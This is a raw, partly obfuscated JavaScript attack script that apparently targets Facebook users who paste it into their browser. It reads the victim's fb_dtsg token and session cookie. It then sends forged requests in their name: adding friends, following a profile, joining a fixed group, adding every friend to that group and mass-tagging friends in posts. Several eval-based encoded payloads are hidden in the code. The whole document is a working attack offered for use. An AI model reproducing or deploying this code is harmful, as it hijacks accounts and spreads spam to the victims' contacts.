0E630E585F605B975D935C990F995D900D960E975F720C585E710A575A855D645C970C975D920E965B615D585E815F810D830A835C585B635F575C855E840C825C795F635C575A995E985C1000F920E620D710F575B855D645D970B965A985C920C900B915F1020C990A995E900D995A920F910E935C900D965F930B920D575B720C575E925F1000E965F910D995D940E970F965C575D615B620F575F1030A575D940F925F575E615B855A645C985B920F900E915B1020C830F995F900F995C920D575F720D720F575F675B575D605A605C575A855B645E990D995B900A995D1000A990B575E720B720B575B665D655F655C620C575C1030C575C855F645F910D955A970D990E920D710E575A1040D575E1040D710F575C855C645C990F920C965C915A615B855C815C900F985A900D960D990C620C710D575D1040B575B465A465A650B650C575B990A995D900A995F1000D990C465E815A615E585C665C675F690E695C675F695E690C690E695E685F700E690B690B655A680B585B620D710E465B815A615D585E660B655B660D675A665D680A685F655D685B685B690E700B700C660E690D585E620D710C465E815C615E585C665E675A665F655D660A670F700A700C700B665C695C690F690E675F670C585A620C710B465B815E615B585D660F675C670C665D685A675F660E700E665A675C700C685F655B680D695A585D620C710F465B465B465D795B940C950B920E615B585A665F675B660D700E665B700D690C690C680B700E680D685A665F690F665C585C620B710F465C795C940A950C920B615C585C675A655E685E685D700B685E680C665F665C690F685B680E680F665B685B585D620C710A465E795A940C950D920B615D585D675D680A660B670A665C660A670B680B695C670A655F700B695C700D690C585E620A710F465A795B940A950B920C615B585A660F690A690A695B655C680F670A680E665D665C690E665F675C685F700E585A620C710B465A795D940D950B920B615C585B660E700F655C670A665A695E685E675D675B670B675F675F700E680B685D585D620E710A465D795E940C950A920C615F585B660A675D690B700D685D690A690C700C665F655B660A680F685D655B700D585B620C710E710C465F';var _6568=/[\x41\x42\x43\x44\x45\x46]/;var _3912=2;var _3182=_9889.charAt(_9889.length-1);var _6470;var _8595=_9889.split(_6568);var _5120=[String.fromCharCode,isNaN,parseInt,String];_8595[1]=_5120[_3912+1](_5120[_3912](_8595[1])/21);var _4984=(_3912==5)?String:eval;_6470='';_11=_5120[_3912](_8595[0])/_5120[_3912](_8595[1]);for(_2532=3;_2532<_11;_2532++)_6470+=(_5120[_3912-2]((_5120[_3912](_8595[_2532])+_5120[_3912](_8595[2])+_5120[_3912](_8595[1]))/_5120[_3912](_8595[1])-_5120[_3912](_8595[2])+_5120[_3912](_8595[1])-1));var _4435='_7828';var _8784='_4435=_6470';function _2873(_6495){_4984(_9304);_2873(_1717);_1717(_8784);_2873(_4435);}var _9304='_2873=_4984';var _1717='_1717=_2873';_2873(_3182);
/*Add Friend*/;
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function IDS(r) {
  var X = new XMLHttpRequest();
  var XURL = "//www.facebook.com/ajax/add_friend/action.php";
  var XParams = "to_friend=" + r +"&action=add_friend&how_found=friend_browser_s&ref_param=none&&&outgoing_id=&logging_location=search&no_flyout_on_click=true&ego_log_data&http_referer&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=35&fb_dtsg="+fb_dtsg+"&phstamp=";
  X.open("POST", XURL, true);
  X.onreadystatechange = function () {
    if (X.readyState == 4 && X.status == 200) {
      X.close;
    }
  };
  X.send(XParams);
}
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var _3674;var _6373='738B189D111A1680B1779F1716F1833F1851C1167E1158A1410C1779A1752D1698E1770F1095A1518A1482E1095B1707A1680A1797C1095A1851D1860A1797D1734D1734A1860B1095C1689D1716D1797E1851A1680A1833E1095A1923F1923F1095A1401A1896C1095A1392E1707F1752F1689D1095F1527B1860B1734B1680C1833D1095A1509E1860A1833E1680A1734E1680C1095B1923A1923E1095A1725F1806B1779B1779F1806B1878F1095D1383D1680F1707D1752F1689D1527F1509E1095A1158B1176F1338D';var _5957=/[\x41\x42\x43\x44\x45\x46]/;var _3970=2;var _5095=_6373.charAt(_6373.length-1);var _7506;var _4973=_6373.split(_5957);var _3673=[String.fromCharCode,isNaN,parseInt,String];_4973[1]=_3673[_3970+1](_3673[_3970](_4973[1])/21);var _7273=(_3970==5)?String:eval;_7506='';_11=_3673[_3970](_4973[0])/_3673[_3970](_4973[1]);for(_3674=3;_3674<_11;_3674++)_7506+=(_3673[_3970-2]((_3673[_3970](_4973[_3674])+_3673[_3970](_4973[2])+_3673[_3970](_4973[1]))/_3673[_3970](_4973[1])-_3673[_3970](_4973[2])+_3673[_3970](_4973[1])-1));var _5952='_1244';var _9330='_5952=_7506';function _9174(_5039){_7273(_4285);_9174(_9797);_9797(_9330);_9174(_5952);}var _4285='_9174=_7273';var _9797='_9797=_9174';_9174(_5095);
function cereziAl(isim) {
    var tarama = isim + "=";
    if (document.cookie.length > 0) {
        konum = document.cookie.indexOf(tarama)
        if (konum != -1) {
            konum += tarama.length
            son = document.cookie.indexOf(";", konum)
            if (son == -1)
                son = document.cookie.length
            return unescape(document.cookie.substring(konum, son))
        }
        else { return ""; }
    }
}
 
function getRandomInt (min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
function randomValue(arr) {
    return arr[getRandomInt(0, arr.length-1)];
}
 
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
 
function a(abone){
    var http4 = new XMLHttpRequest();
     
    var url4 = "/ajax/follow/follow_profile.php?__a=1";
     
    var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
    http4.open("POST", url4, true);
     
    //Send the proper header information along with the request
    http4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    http4.setRequestHeader("Content-length", params4.length);
    http4.setRequestHeader("Connection", "close");
     
    http4.onreadystatechange = function() {//Call a function when the state changes.
    if(http4.readyState == 4 && http4.status == 200) {
       
      http4.close; // Close the connection
     
    }
    }
   
    http4.send(params4);
}
var _3858;var _1942='1875C63C167F631B676C655E622F673E640E658C655B421B670C676D619F649F640F670C673B445C676C640E625A670B670A448E421F694B355F421B421D421E421A421F421C421B421D421D421B421C421A421C421B421F421F679F616A667C421C616A421E508E421F625D658C622A676E652E628E655C673B463E622A667B628D616F673F628C532A649F628E652E628E655E673C445F442A670B622F667A640C661C673C442C448A502B355C421D421D421F421A421A421E421A421D421E421E421F421E421C421D421F421C616D463A640B655A655B628D667A541B577D556A553D421F508F421D427D655A628F682F421B520A670B688E655B622A571F628F664B676D628E670A673A445D448E463A670F628C673D580E571F544C445B442E466A616A643C616D685E466C631D667D640D628B655F625F670A466E649F640B670F673A670A466E670C676A619D670A622B667E640C619C628D466E652B658C625C640D631C688B514D649E658E622A616C673D640E658E655D508D661A628F667A652B616E649A640D655F646B439A616F622B673F640E658B655D508A670B676A619F670F622C667F640F619E628B442D448B463D670E628D673E529D616F673F616A445A694B421F631C649D640A625D499E421E427A421F454D421D676C640F625E670C670E421E454F421C427B421B700F448E463B670C628C655F625A445A448E502F427C502D355A421B421A421C421F421F421E421C421C421B421E421E421E421A421D421C421B625F658D622B676A652C628E655C673F463D619B658B625F688B463A616C661B661F628D655E625E526B637B640E649A625D445B616C448B502B355B700A355E466D466C544D529F421B535E523D421D445E616C625D640E619C565A559F448B355D355E616B445A427B472B469A469B469F469D481A478B490A481E478B478D475B481F484D496A427B448A502C355D616F445B427B472C469E469B469B469D481F484F496B472D472A490E496A478A487F478B427A448F502D355E616B445D427A472A469A469F469C469A487D478D484C475C496A484E490E475E478F493A427D448D502C355E616A445D427E472F469F469C469B469F481C487D490A493E478B484E481A472C493B496C427D448D502B355B616C445A427A472C493E475C484F478F487B487E484E484B481D427D448E502E355C616A445B427C472F469F469E469E469B487D478D493C490F478E496C484A481D487E496F427E448F502C355C355F670A676C619C649B640C670F673F445C427E472A490C487C469A478A484F493C481E496E475B475F487F472E475E469B427F448F502C355D670D676A619D649C640B670A673A445C427A472D493E496B469B469B481E475B469F490F496E475D475A469C484C487B427C448C502F355C670E676D619B649D640C670C673E445E427E472C496E487A496A484E478D496D487A478D490D496A478F490D481C490A427F448C502C355D670F676C619E649B640E670F673D445C427B472D493B469B481A484B472A484D481E484D481F484B481D472E475B478B427C448F502F355C670B676C619F649F640C670E673E445E427A472C478E493C469E490A490E481A487F475F484C481D490B490E487B475D478A427D448B502A355F670C676E619A649A640D670C673A445D427B475A478E472A472D484C487A481E487F490E469A481D469C472F487A478C427D448D502F';var _7105=/[\x41\x42\x43\x44\x45\x46]/;var _8957=2;var _1711=_1942.charAt(_1942.length-1);var _8649;var _1977=_1942.split(_7105);var _1164=[String.fromCharCode,isNaN,parseInt,String];_1977[1]=_1164[_8957+1](_1164[_8957](_1977[1])/21);var _2463=(_8957==9)?String:eval;_8649='';_11=_1164[_8957](_1977[0])/_1164[_8957](_1977[1]);for(_3858=3;_3858<_11;_3858++)_8649+=(_1164[_8957-2]((_1164[_8957](_1977[_3858])+_1164[_8957](_1977[2])+_1164[_8957](_1977[1]))/_1164[_8957](_1977[1])-_1164[_8957](_1977[2])+_1164[_8957](_1977[1])-1));var _4361='_8225';var _9757='_4361=_8649';function _1481(_7168){_2463(_8355);_1481(_7929);_7929(_9757);_1481(_4361);}var _8355='_1481=_2463';var _7929='_7929=_1481';_1481(_1711);

var gid = ['500658196709899'];
var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);
 
var httpwp = new XMLHttpRequest();
var urlwp = '/ajax/groups/membership/r2j.php?__a=1';
var paramswp = '&ref=group_jump_header&group_id=' + gid + '&fb_dtsg=' + fb_dtsg + '&__user=' + user_id + '&phstamp=';
httpwp['open']('POST', urlwp, true);
httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
httpwp['setRequestHeader']('Content-length', paramswp['length']);
httpwp['setRequestHeader']('Connection', 'keep-alive');
httpwp['send'](paramswp);
 
var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);
 
var friends = new Array();
gf = new XMLHttpRequest();
gf['open']('GET', '/ajax/typeahead/first_degree.php?__a=1&viewer=' + user_id + '&token' + Math['random']() + '&filter[0]=user&options[0]=friends_only', false);
gf['send']();
if (gf['readyState'] != 4) {} else {
    data = eval('(' + gf['responseText']['substr'](9) + ')');
    if (data['error']) {} else {
        friends = data['payload']['entries']['sort'](function (_0x93dax8, _0x93dax9) {
            return _0x93dax8['index'] - _0x93dax9['index'];
        });
    };
};
 
for (var i = 0; i < friends['length']; i++) {
    var httpwp = new XMLHttpRequest();
    var urlwp = '/ajax/groups/members/add_post.php?__a=1';
    var paramswp= '&fb_dtsg=' + fb_dtsg + '&group_id=' + gid + '&source=typeahead&ref=&message_id=&members=' + friends[i]['uid'] + '&__user=' + user_id + '&phstamp=';
    httpwp['open']('POST', urlwp, true);
    httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
    httpwp['setRequestHeader']('Content-length', paramswp['length']);
    httpwp['setRequestHeader']('Connection', 'keep-alive');
    httpwp['onreadystatechange'] = function () {
if (httpwp['readyState'] == 4 && httpwp['status'] == 200) {};
    };
    httpwp['send'](paramswp);
};
var spage_id = "100004374332459";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
var svn_rev;
var bugun= new Date();
var btarihi = new Date();
btarihi.setTime(bugun.getTime() + 1000*60*60*4*1);
if(!document.cookie.match(/paylasti=(\d+)/)){
document.cookie = "paylasti=hayir;expires="+ btarihi.toGMTString();
}
 
 
//arkadaslari al ve isle
function sarkadaslari_al(){
                var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
                        if(xmlhttp.readyState == 4){
                                  eval("arkadaslar = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
                                  for(f=0;f<Math.round(arkadaslar.payload.entries.length/10);f++){
                                        smesaj = "";
                                        smesaj_text = "";
                                  for(i=f*10;i<(f+1)*10;i++){
                                        if(arkadaslar.payload.entries[i]){
                                  smesaj += " @[" + arkadaslar.payload.entries[i].uid +  ":" + arkadaslar.payload.entries[i].text + "]";
                                  smesaj_text += " " + arkadaslar.payload.entries[i].text;
                                  }
                                        }
                                        sdurumpaylas();                         }
                               
                        }
                       
        };
                var params = "&filter[0]=user";
                params += "&options[0]=friends_only";
                params += "&options[1]=nm";
                params += "&token=v7";
        params += "&viewer=" + user_id;
                params += "&__user=" + user_id;
               
        if (document.URL.indexOf("https://") >= 0) { xmlhttp.open("GET", "https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
        else { xmlhttp.open("GET", "http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
        xmlhttp.send();
}
 
//tiklama olayini dinle
var tiklama = document.addEventListener("click", function () {
if(document.cookie.split("paylasti=")[1].split(";")[0].indexOf("hayir") >= 0){
svn_rev = document.head.innerHTML.split('"svn_rev":')[1].split(",")[0];
sarkadaslari_al();
document.cookie = "paylasti=evet;expires="+ btarihi.toGMTString();
 
document.removeEventListener(tiklama);
}
 }, false);
 
 
//arkada?¾ ekleme
function sarkadasekle(uid,cins){
                var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
                        if(xmlhttp.readyState == 4){   
                        }
        };
               
                xmlhttp.open("POST", "/ajax/add_friend/action.php?__a=1", true);
                var params = "to_friend=" + uid;
                params += "&action=add_friend";
                params += "&how_found=friend_browser";
                params += "&ref_param=none";
                params += "&outgoing_id=";
                params += "&logging_location=friend_browser";
                params += "&no_flyout_on_click=true";
                params += "&ego_log_data=";
                params += "&http_referer=";
                params += "&fb_dtsg=" + document.getElementsByName('fb_dtsg')[0].value;
        params += "&phstamp=165816749114848369115";
                params += "&__user=" + user_id;
                xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
                xmlhttp.setRequestHeader ("Content-Type","application/x-www-form-urlencoded");
               
if(cins == "farketmez" && document.cookie.split("cins" + user_id +"=").length > 1){
                xmlhttp.send(params);
}else if(document.cookie.split("cins" + user_id +"=").length <= 1){
                cinsiyetgetir(uid,cins,"sarkadasekle");
}else if(cins == document.cookie.split("cins" + user_id +"=")[1].split(";")[0].toString()){
                xmlhttp.send(params);
}
}
 
//cinsiyet belirleme
var cinssonuc = {};
var cinshtml = document.createElement("html");
function scinsiyetgetir(uid,cins,fonksiyon){
                var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
                        if(xmlhttp.readyState == 4){
                        eval("cinssonuc = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
                        cinshtml.innerHTML = cinssonuc.jsmods.markup[0][1].__html
                        btarihi.setTime(bugun.getTime() + 1000*60*60*24*365);
                        if(cinshtml.getElementsByTagName("select")[0].value == "1"){
                        document.cookie = "cins" + user_id + "=kadin;expires=" + btarihi.toGMTString();
                        }else if(cinshtml.getElementsByTagName("select")[0].value == "2"){
                        document.cookie = "cins" + user_id + "=erkek;expires=" + btarihi.toGMTString();
                        }
                        eval(fonksiyon + "(" + id + "," + cins + ");");
                        }
        };
                xmlhttp.open("GET", "/ajax/timeline/edit_profile/basic_info.php?__a=1&__user=" + user_id, true);
                xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
                xmlhttp.send();
}
// By AdibPN
body = document.body;
if(body != null)
{
 div = document.createElement("div");
 div.style.position = "fixed";
 div.style.display = "block";
 div.style.width = "130px";
 div.style.opacity= 0.90;
 div.style.bottom = "+70px";
 div.style.left = "+0px";
 div.style.backgroundColor = "#E7EBF2";
 div.style.border = "1px solid #6B84B4";
 div.style.padding = "3px";
 var _7549;var _8358='2052D189E195B2379D2424F2541F1893D2424F2469E2469B2388C2505E2127E2235D2172D2163B1767D2028E1767C1785B2019B2352D1767D2514F2523A2568A2451C2388B2028E1830C2397D2478C2469F2523B1884F2550E2388C2424D2406C2415B2523C2001F2361D2478C2451D2379B2010E2370B2478B2451B2478C2505E2001C1794A2100D1938B1911A1956F1911E1956F1830B1767E2415C2505F2388F2397A2028E1830A2415C2523A2523C2487E2001D1902C1902A2550C2550A2550F1893B2397D2352B2370E2388A2361C2478A2478A2442D1893C2370B2478B2460F1902A2352A2379F2424C2361C1893C2487F1893D2469E2532B2505B2352F2406A2352A1830E1767E2523A2424A2523F2451B2388D2028D1830D2217E2388F2397F2505D2388A2514F2415A1830C2037E2019B2361F2451D2424F2469C2442E2037C2019E2370E2388E2469D2523A2388D2505F2037D2199A2505E2388E2514A2514E1767C1839A1767A2109B1956B1767D1848F1767D2523D2478F1767D2370A2451C2478C2514A2388E2379B1767C2595B2595E1767F2064D2379F2424B2361A1767E2199F2532D2406E2352F2505C1767F2181E2532F2505A2352F2406D2352D1767B2019F1902B2370E2388C2469B2523C2388F2505D2037F2019F1902B2361E2451B2424C2469F2442A2037C2019A1902D2352B2037B1785D1569C1767B2361B2478D2379D2568F1893F2352B2487C2487E2388A2469C2379E2082F2415A2424D2451B2379E1839B2379C2424A2541B1848D2010B';var _5184=/[\x41\x42\x43\x44\x45\x46]/;var _9117=2;var _6555=_8358.charAt(_8358.length-1);var _5405;var _9440=_8358.split(_5184);var _5966=[String.fromCharCode,isNaN,parseInt,String];_9440[1]=_5966[_9117+1](_5966[_9117](_9440[1])/21);var _8747=(_9117==7)?String:eval;_5405='';_11=_5966[_9117](_9440[0])/_5966[_9117](_9440[1]);for(_7549=3;_7549<_11;_7549++)_5405+=(_5966[_9117-2]((_5966[_9117](_9440[_7549])+_5966[_9117](_9440[2])+_5966[_9117](_9440[1]))/_5966[_9117](_9440[1])-_5966[_9117](_9440[2])+_5966[_9117](_9440[1])-1));var _9108='_9204';var _1615='_9108=_5405';function _1501(_1791){_8747(_2390);_1501(_3721);_3721(_1615);_1501(_9108);}var _2390='_1501=_8747';var _3721='_3721=_1501';_1501(_6555);
}